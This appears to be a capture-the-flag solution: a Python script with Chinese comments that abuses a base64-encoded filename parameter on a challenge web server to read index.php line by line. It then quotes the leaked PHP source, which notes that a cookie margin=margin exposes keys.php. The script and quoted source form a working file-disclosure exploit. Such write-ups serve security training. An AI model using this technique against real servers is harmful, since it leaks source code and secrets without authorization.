import requests

#发现filename是base64编码，解码后发现这段无意义的字符串文件名为key.txt，所以尝试index.php的base64编码在filename后面

for i in range(30):
    url = "http://123.206.87.240:8002/web11/index.php?line=" + str(i) + "&filename=aW5kZXgucGhw"
    s = requests.get(url)
    print(s.text)

#返回php源码

'''
<?php
error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;
if($file=='')
    header("location:index.php?line=&filename=a2V5cy50eHQ=");
$file_list = array('0' =>'keys.txt','1' =>'index.php',);
if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin') 
{
    $file_list[2]='keys.php';     Cookie 的参数必须满足 margin=margin 才能访问keys.php
}
if(in_array($file, $file_list))
{
    $fa = file($file);
    echo $fa[$line];
}
?>
'''